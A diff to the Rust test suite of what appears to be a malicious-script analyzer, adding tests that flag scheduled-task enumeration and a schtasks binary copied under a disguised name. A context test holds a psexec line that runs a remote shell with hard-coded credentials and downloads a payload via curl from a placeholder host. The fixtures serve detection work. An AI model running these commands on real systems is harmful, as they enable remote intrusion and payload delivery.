@@ -4310,6 +4310,51 @@ C:\Users\Public\wm.tmp startup get Command
     }
 
     #[test]
+    fn schtasks_query_emits_enumeration_trait() {
+        let report = analyze(
+            br#"schtasks /query /tn "Updater""#,
+            &AnalyzeConfig::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "schtasks-query" && command == r#"schtasks /query /tn "Updater""#
+            )),
+            "schtasks query enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_schtasks_alias_query_emits_enumeration_trait() {
+        let script = br#"copy C:\Windows\System32\schtasks.exe C:\Users\Public\st.tmp
+C:\Users\Public\st.tmp /query /fo LIST
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\st.tmp"#)
+            )),
+            "copied schtasks alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "schtasks-query" && command == "schtasks.exe /query /fo LIST"
+            )),
+            "copied schtasks query enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
